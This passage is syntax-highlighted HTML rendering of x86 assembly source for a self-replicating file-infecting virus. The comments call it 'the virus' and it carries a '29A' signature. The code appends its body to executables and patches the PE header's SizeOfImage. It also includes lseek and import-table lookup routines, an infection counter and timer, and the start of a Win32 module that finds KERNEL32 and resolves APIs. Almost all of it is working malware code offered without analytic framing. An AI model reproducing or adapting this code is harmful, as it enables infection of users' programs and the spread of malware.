                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_SizeOfImage</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cdq</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_SizeOfImage</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Lseek to the offset of the PE header and</span><span class="sc0">
                </span><span class="sc1">; rewrite the recently modified and updated</span><span class="sc0">
                </span><span class="sc1">; one the infected file will use from now</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">winexe_offset</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_middle</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc1">; And now finally lseek to the end of the</span><span class="sc0">
                </span><span class="sc1">; file and append our code to the PE file</span><span class="sc0">
                </span><span class="sc1">; we've just infected - we can go away</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_end</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">espo_start</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">go_away</span><span class="sc0">

</span><span class="sc1">; ÍÍ¹ Subroutines ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Note: the following subroutines are used by the DOS and Windows 3.1x mo-</span><span class="sc0">
</span><span class="sc1">;   dules, in order to perform many repeated actions such as lseeking to the</span><span class="sc0">
</span><span class="sc1">;   start or the end of a file, finding RVAs, and so on.</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Lseek to the start of a file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Entry:</span><span class="sc0">
</span><span class="sc1">;     ş BX =&gt; file handle</span><span class="sc0">
</span><span class="sc1">;     ş File pointer somewhere in the file</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Exit:</span><span class="sc0">
</span><span class="sc1">;     ş BX =&gt; file handle</span><span class="sc0">
</span><span class="sc1">;     ş File pointer in the start of the file</span><span class="sc0">

</span><span class="sc5">lseek_start</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                    </span><span class="sc1">; Lseek function, with</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; AL, CX and DX = 0,</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">                                 </span><span class="sc1">; ie, lseek to start of</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; the file in BX</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                                 </span><span class="sc1">; And go back to code</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Lseek to the middle of a file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Entry:</span><span class="sc0">
</span><span class="sc1">;     ş BX =&gt; file handle</span><span class="sc0">
</span><span class="sc1">;     ş DX =&gt; seek offset</span><span class="sc0">
</span><span class="sc1">;     ş File pointer somewhere in the file</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Exit:</span><span class="sc0">
</span><span class="sc1">;     ş BX =&gt; file handle</span><span class="sc0">
</span><span class="sc1">;     ş File pointer = previous DX value</span><span class="sc0">

</span><span class="sc5">lseek_middle</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                    </span><span class="sc1">; Lseek function, the</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; offset where to seek</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; is specified in CX</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                                 </span><span class="sc1">; Return to our caller</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Lseek to the end of a file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Entry:</span><span class="sc0">
</span><span class="sc1">;     ş BX =&gt; file handle</span><span class="sc0">
</span><span class="sc1">;     ş File pointer somewhere in the file</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Exit:</span><span class="sc0">
</span><span class="sc1">;     ş BX =&gt; file handle</span><span class="sc0">
</span><span class="sc1">;     ş File pointer in the end of the file</span><span class="sc0">

</span><span class="sc5">lseek_end</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                    </span><span class="sc1">; Lseek function, with</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; AL=2 (from bottom),</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">                                 </span><span class="sc1">; CX and DX equal to</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; zero -&gt; lseek to end</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                                 </span><span class="sc1">; Return to main code</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Look for the RVA of a given API by name ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Entry:</span><span class="sc0">
</span><span class="sc1">;     ş EDX    =&gt; Section ëelta-offset</span><span class="sc0">
</span><span class="sc1">;     ş DS:ESI =&gt; Import address table for KERNEL32.DLL</span><span class="sc0">
</span><span class="sc1">;     ş DS:EDI =&gt; Given API name to look for</span><span class="sc0">
</span><span class="sc1">;     ş EBP    =&gt; Buffer start address</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Exit:</span><span class="sc0">
</span><span class="sc1">;      EAX    =&gt; RVA of the given IMD, or 0 if error</span><span class="sc0">

</span><span class="sc5">search_name</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">; Look for a given API (in EDI) whose RVA we</span><span class="sc0">
                </span><span class="sc1">; are looking for by means of the structure</span><span class="sc0">
                </span><span class="sc1">; IMAGE_IMPORT_BY_NAME, pointed by every dword</span><span class="sc0">
                </span><span class="sc1">; in the thunk data array. First step consists</span><span class="sc0">
                </span><span class="sc1">; on looking for its address (DS:ESI)</span><span class="sc0">

                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">inp_notfound</span><span class="sc0">

                </span><span class="sc1">; Once found, we get a pointer to the first</span><span class="sc0">
                </span><span class="sc1">; function name of this structure, and compare</span><span class="sc0">
                </span><span class="sc1">; it with the name of the API we look for</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">thunk_offset</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">namebyname</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">inputfound</span><span class="sc0">

                </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">namebyname</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">search_name</span><span class="sc0">

                </span><span class="sc1">; In case names match, we go and get the</span><span class="sc0">
                </span><span class="sc1">; RVA of the function we've just found in</span><span class="sc0">
                </span><span class="sc1">; the IAT. Otherwise we keep on searching</span><span class="sc0">

</span><span class="sc5">inputfound</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">thunk_offset</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">stupid_jump</span><span class="sc0">

                </span><span class="sc1">; I know this jump is completely stupid</span><span class="sc0">
                </span><span class="sc1">; and non-sense, but i felt like to write</span><span class="sc0">
                </span><span class="sc1">; such a fool thing when writing the virus</span><span class="sc0">
                </span><span class="sc1">; and i decided to keep it :)</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'29A'</span><span class="sc0">

                </span><span class="sc1">; We calculate the RVA and return it in</span><span class="sc0">
                </span><span class="sc1">; EAX so it may be later stored in its</span><span class="sc0">
                </span><span class="sc1">; corresponding dynamic variable</span><span class="sc0">

</span><span class="sc5">stupid_jump</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

                </span><span class="sc1">; If we couldn't find the RVA of the API,</span><span class="sc0">
                </span><span class="sc1">; then we return with EAX equal to zero</span><span class="sc0">

</span><span class="sc5">inp_notfound</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Check system conditions before infection ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Entry:</span><span class="sc0">
</span><span class="sc1">;     ş BX =&gt; handle of possible victim</span><span class="sc0">
</span><span class="sc1">;     ş Infection counter holding a value 0-3</span><span class="sc0">
</span><span class="sc1">;     ş Infection timer holding a certain value</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Good exit:</span><span class="sc0">
</span><span class="sc1">;     ş AH =&gt; 2ch</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Exit with error:</span><span class="sc0">
</span><span class="sc1">;     ş AH =&gt; 0</span><span class="sc0">
</span><span class="sc1">;     ş Infection counter set to 0</span><span class="sc0">
</span><span class="sc1">;     ş Infection timer updated</span><span class="sc0">

</span><span class="sc5">system_checks</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">                      </span><span class="sc1">; Get system time to</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; do our inf.checks</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inf_counter</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; Have we already</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">check_time</span><span class="sc0">                  </span><span class="sc1">; infected 3 files?</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inf_counter</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; Yes, update the</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">set_error</span><span class="sc0">                   </span><span class="sc1">; infection counter</span><span class="sc0">

</span><span class="sc5">check_time</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inf_timer</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">  </span><span class="sc1">; Are we still in the</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">go_for_it</span><span class="sc0">                   </span><span class="sc1">; same minute?</span><span class="sc0">

</span><span class="sc5">set_error</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cbw</span><span class="sc0">                                 </span><span class="sc1">; Set AH=0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inf_timer</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">  </span><span class="sc1">; Update the timer</span><span class="sc0">
</span><span class="sc5">go_for_it</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">                                 </span><span class="sc1">; And return</span><span class="sc0">

</span><span class="sc1">; ÍÍ¹ Win32 module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

                </span><span class="sc2">.386p</span><span class="sc0">                               </span><span class="sc1">; Intel 80386+ PMODE</span><span class="sc0">
</span><span class="sc5">espow32_start</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">                        </span><span class="sc1">; Define 32-bit start</span><span class="sc0">

</span><span class="sc5">first_entry</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Push for later use</span><span class="sc0">
</span><span class="sc5">pe_entry</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pushad</span><span class="sc0">                              </span><span class="sc1">; Push all the stuff</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta_offset</span><span class="sc0">                </span><span class="sc1">; Get ëelta-offset</span><span class="sc0">
</span><span class="sc5">dseta_byte</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">                        </span><span class="sc1">; Dseta-offset marker</span><span class="sc0">
</span><span class="sc5">delta_offset</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                         </span><span class="sc1">; Get return address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                     </span><span class="sc1">; Store it in EBX</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_offset</span><span class="sc0">     </span><span class="sc1">; Get ëelta in EBP</span><span class="sc0">

                </span><span class="sc1">; Get the base address of our host in</span><span class="sc0">
                </span><span class="sc1">; EBX, by means of substracting its</span><span class="sc0">
                </span><span class="sc1">; RVA, stored during the PE infection</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc0">
</span><span class="sc5">base_address</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_entry</span><span class="sc4">-</span><span class="sc5">base_default</span><span class="sc4">+</span><span class="sc5">dseta_offset</span><span class="sc0">

                </span><span class="sc1">; Now get the return address, ie, the</span><span class="sc0">
                </span><span class="sc1">; original entry point of the PE file,</span><span class="sc0">
                </span><span class="sc1">; in EAX and push it onto the stack</span><span class="sc0">
                </span><span class="sc1">; for later use during our execution</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">entry_rva</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_process</span><span class="sc4">-</span><span class="sc5">base_default</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; The following step consists on getting</span><span class="sc0">
                </span><span class="sc1">; the RVA of GetModuleHandleA in EAX, so</span><span class="sc0">
                </span><span class="sc1">; we may get the base address of KERNEL32</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">gmhandle_rva</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gmhandle_a</span><span class="sc4">-</span><span class="sc5">base_default</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">get_kernel32</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gmhandle_a</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">; If everything has gone ok, we're now</span><span class="sc0">
                </span><span class="sc1">; about to call the GetModuleHandle API</span><span class="sc0">
                </span><span class="sc1">; in order to know KERNEL32's address.</span><span class="sc0">
                </span><span class="sc1">; Otherwise we had to jump to our own</span><span class="sc0">
                </span><span class="sc1">; routine which gets this value by means</span><span class="sc0">
                </span><span class="sc1">; of undocumented features of Windows95</span><span class="sc0">
                </span><span class="sc1">; (not valid for the rest of Win32!)</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32_n</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gmhandle_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">get_kernel32</span><span class="sc0">
</span><span class="sc5">kernel_found</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32_a</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Once we've found the base address of</span><span class="sc0">
                </span><span class="sc1">; KERNEL32 it's necessary to use the API</span><span class="sc0">
                </span><span class="sc1">; GetProcAddress in order to look for</span><span class="sc0">
                </span><span class="sc1">; the addresses of the functions we need</span><span class="sc0">
                </span><span class="sc1">; to use in our code in order to work</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">gpaddress_rva</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gpaddress_a</span><span class="sc4">-</span><span class="sc5">base_default</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">get_gpaddress</span><span class="sc0">

</span><span class="sc5">gpadd_found</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gpaddress_a</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">; Point to the start of the table of API</span><span class="sc0">
                </span><span class="sc1">; names with ESI, and to the start of the</span><span class="sc0">
                </span><span class="sc1">; table of API addresses with EDI, holding</span><span class="sc0">
                </span><span class="sc1">; the number of needed API functions in</span><span class="sc0">
                </span><span class="sc1">; ECX, and then call GetProcAddress so we</span><span class="sc0">
                </span><span class="sc1">; may fill the table of API addresses with</span><span class="sc0">
                </span><span class="sc1">; the current valid values for our APIs</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">api_names_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">api_names</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">api_names</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">api_addresses</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">find_more_api</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
